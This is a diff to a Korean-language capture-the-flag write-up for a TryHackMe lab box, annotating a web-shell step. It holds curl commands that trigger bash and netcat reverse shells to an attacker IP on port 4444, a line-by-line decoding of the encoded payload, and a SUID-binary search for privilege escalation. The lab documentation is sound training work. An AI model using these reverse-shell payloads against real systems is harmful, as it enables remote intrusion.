@@ -455,8 +455,28 @@ curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/sh -i >& /dev/tcp
 # success
 # bash
 curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=/bin/bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.8.136.212/4444+0%3E%261%22
-# sh
-curl http://files.lookup.thm/elFinder/php/SecSignal.php?c=nc+10.8.136.212+4444+-e+/bin/sh
+
+# URL 인코딩: /bin/bash+-c+
+# 디코딩: /bin/bash -c
+# 설명: bash로 명령을 실행하되, -c 옵션을 줘서 문자열 형태의 명령어를 실행하겠다는 의미
+# URL 인코딩: %22
+# 디코딩: "
+# 설명: 큰따옴표로 명령어 문자열을 감싸기 위한 것. bash -c 뒤에 실행할 전체 명령을 묶기 위해 사용됨
+# URL 인코딩: bash+-i+
+# 디코딩: bash -i
+# 설명: bash를 인터랙티브 모드로 실행. 대화형 셸을 열기 위한 핵심 옵션
+# URL 인코딩: %3E%26
+# 디코딩: >&
+# 설명: 표준 출력(stdout)을 리디렉션해서 다른 곳으로 보냄. 여기선 TCP 연결로 출력 보내는 것
+# URL 인코딩: +/dev/tcp/10.8.136.212/4444+
+# 디코딩: /dev/tcp/10.8.136.212/4444
+# 설명: bash에서 지원하는 특수 파일 경로. 여기에 연결하면 TCP 연결이 생김 (공격자 리스너와 연결됨)
+# URL 인코딩: 0%3E%261
+# 디코딩: 0>&1
+# 설명: 표준 입력(stdin)을 표준 출력(stdout)으로 리디렉션. 이렇게 하면 입력도 공격자 쪽으로 전달됨
+# URL 인코딩: %22
+# 디코딩: "
+# 설명: 명령어 문자열 끝을 닫는 큰따옴표. bash -c 명령어를 완성함
 ```
 
 # tty 획득
@@ -487,7 +507,7 @@ reset
 # 키 입력이나 화면 출력 문제 해결에 도움
 ```
 
-# find / -perm -4000 4>/dev/null
+# find / -perm -4000 4>/dev/null -type f
 
 www-data@ip-10-10-248-63:/var/www/files.lookup.thm/public_html/elFinder/php$ find / -perm -4000 2>/dev/null
 /snap/snapd/19457/usr/lib/snapd/snap-confine
